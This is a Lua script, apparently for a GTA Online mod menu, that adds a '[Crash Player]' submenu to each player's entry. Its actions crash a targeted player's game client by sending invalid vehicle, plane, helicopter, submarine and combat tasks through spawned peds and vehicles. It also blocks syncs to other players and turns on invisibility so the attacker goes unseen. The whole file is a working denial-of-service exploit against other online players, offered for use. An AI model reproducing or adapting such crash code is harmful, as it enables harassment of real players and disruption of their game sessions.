util.require_natives(1640181023)
local function player(pid)    
    
local function request_model(hash, timeout)
    timeout = timeout or 5 --5s timeout default
    STREAMING.REQUEST_MODEL(hash)
    local cur_time = os.time()
    local end_time = cur_time + timeout
    while not STREAMING.HAS_MODEL_LOADED(hash) and end_time >= os.time() do
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end


local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end
    local function setAttribute(attacker)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)

        PED.SET_PED_COMBAT_RANGE(attacker, 4)
        PED.SET_PED_COMBAT_ABILITY(attacker, 3)
    end


local bozocwash = menu.list(menu.player_root(pid), "[Crash Player]", {""}, "")
      

local InvalidTasks = menu.list(bozocwash, "Invalid Tasks", {}, "")


local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
local my_ped = PLAYER.GET_PLAYER_PED(players.user())

menu.action(InvalidTasks, "Invalid Vehicle State", {""}, "", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    pos.z = pos.z - 50

    BlockSyncs(pid, function()
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")

        ENTITY.FREEZE_ENTITY_POSITION(my_ped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z, false, false, false)
        util.yield()
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, #allvehicles do
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
        end
        util.yield()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z, false, false, false)
        ENTITY.FREEZE_ENTITY_POSITION(my_ped, false)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
    end)
end)
       menu.action(InvalidTasks, "Invalid Plane Task", {"task1"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("t20")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            BlockSyncs(pid, function()
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
               local veh = entities.create_vehicle(veh_mdl, pos, 0)
          
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_PLANE_LAND(jesus, veh, ped, 10.0, 0, 10, 0, 0,0)  --A2
                util.yield(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end
     
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    end) 
    menu.action(InvalidTasks, "Invalid Heli Task", {"task2"}, "Works on most menus. <3", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("zentorno")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            BlockSyncs(pid, function()
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
               local veh = entities.create_vehicle(veh_mdl, pos, 0)
          
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                         
                util.yield(1000)
                entities.delete_by_handle(jesus)
               entities.delete_by_handle(veh)
            end
     
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    end)
            menu.action(InvalidTasks, "Invalid Submarine Task", {"task3"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("adder")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            BlockSyncs(pid, function()
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
               local veh = entities.create_vehicle(veh_mdl, pos, 0)
          
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_SUBMARINE_GOTO_AND_STOP(1, veh, pos.x, pos.y, pos.z, 1)
                util.yield(1000)
                entities.delete_by_handle(jesus)
               entities.delete_by_handle(veh)
            end
     
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    end)
    menu.action(InvalidTasks, "Invalid Combat Task", {}, "I want a capybara crash :(", function()
           BlockSyncs(pid, function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local chop = util.joaat('a_c_rabbit_01')
        STREAMING.REQUEST_MODEL(chop)
        while not STREAMING.HAS_MODEL_LOADED(chop) do
            STREAMING.REQUEST_MODEL(chop)
            util.yield()
        end
        local achop = entities.create_ped(26, chop, c, 0) 
        WEAPON.GIVE_WEAPON_TO_PED(achop, util.joaat('weapon_grenade'), 9999, false, false)
        WEAPON.SET_CURRENT_PED_WEAPON(achop, util.joaat('weapon_grenade'),true)
        TASK.TASK_COMBAT_PED(achop , p, 0, 16)
        setAttribute(achop)
        TASK.TASK_THROW_PROJECTILE(achop,c.x, c.y, c.z)
        local bchop = entities.create_ped(26, chop, c, 0) 
        WEAPON.GIVE_WEAPON_TO_PED(bchop, util.joaat('weapon_grenade'), 9999, false, false)
        WEAPON.SET_CURRENT_PED_WEAPON(bchop, util.joaat('weapon_grenade'),true)
        TASK.TASK_COMBAT_PED(bchop , p, 0, 16)
        setAttribute(bchop)
        TASK.TASK_THROW_PROJECTILE(bchop,c.x, c.y, c.z)
        util.yield(10000)
        util.toast("Crash done deleting peds")
        entities.delete_by_handle(bchop)
        entities.delete_by_handle(achop)
        if not STREAMING.HAS_MODEL_LOADED(chop) then
            util.toast("Couldn't load the model")
       end
   end)
    end) 


end
players.on_join(player)
players.dispatch_on_join()
util.keep_running()